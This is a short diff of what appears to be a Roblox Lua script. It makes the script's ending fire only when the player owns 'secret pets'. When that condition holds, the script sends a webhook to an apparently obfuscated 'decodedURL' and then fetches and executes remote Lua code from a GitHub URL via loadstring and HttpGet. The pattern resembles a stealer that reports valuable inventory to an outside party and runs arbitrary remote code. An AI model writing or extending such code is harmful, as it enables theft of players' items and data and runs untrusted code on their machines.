@@ -118,8 +118,8 @@ end
 
 refreshSecretPets()
 
-task.wait(5)
-
-SendWebhook(decodedURL)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/VoantplayYt/roblox-banlist/refs/heads/main/ban.lua"))()
+if #InventorySecretPets > 0 then
+	task.wait(5)
+	SendWebhook(decodedURL)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/VoantplayYt/roblox-banlist/refs/heads/main/ban.lua"))()
+end
